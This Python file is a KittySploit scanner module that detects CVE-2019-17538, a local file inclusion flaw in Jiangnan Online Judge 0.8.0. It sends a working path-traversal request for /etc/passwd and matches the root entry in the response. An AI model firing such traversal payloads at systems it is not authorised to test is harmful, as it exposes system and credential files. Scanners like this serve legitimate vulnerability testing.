#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Jiangnan Online Judge (aka jnoj) 0."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Jiangnan Online Judge 0.8.0 - Local File Inclusion Detection',
        'description': 'Jiangnan Online Judge (aka jnoj) 0.8.0 is susceptible to local file inclusion via web/polygon/problem/viewfile?id=1&name=../.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve2019', 'cve', 'jnoj', 'lfi', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/shi-yang/jnoj/issues/53',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-17538',
            'https://github.com/Elsfa7-110/kenzer-templates',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2019-17538',
    }

    def run(self):
        path = '/jnoj/web/polygon/problem/viewfile?id=1&name=../../../../../../../etc/passwd'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='high', reason='Jiangnan Online Judge 0.8.0 - Local File Inclusion detected', path=path)
            return True
        return False

